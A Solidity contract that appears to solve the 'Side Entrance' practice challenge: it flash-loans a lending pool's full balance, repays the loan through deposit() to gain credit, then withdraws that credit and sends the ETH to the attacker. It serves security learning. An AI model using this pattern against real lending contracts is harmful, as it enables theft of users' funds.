pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";

contract FlashLoanEtherReceiver {

    SideEntranceLenderPool public targetPool;
    constructor(address _target) public {
        targetPool = SideEntranceLenderPool(_target);
    }

    function execute() external payable {
        // Step 2. this function is called from the flashLoan; this will deposit the necessary amount back, such as to satisfy
        // the require to return the ETH.
        targetPool.deposit{value: msg.value}(); // fking () call solidity bruh moment
    }

    function exploit() external {
        // Step 1. We flashloan the entire targetPool balance.
        targetPool.flashLoan(address(targetPool).balance);

        // Step 3. We withdraw the amount that we have previously marked as deposited.
        targetPool.withdraw();

        // Step 4. Return the cash to the msg.sender(which is our attacker account).
        payable(msg.sender).transfer(address(this).balance);
    }

    fallback () external payable {
    }
}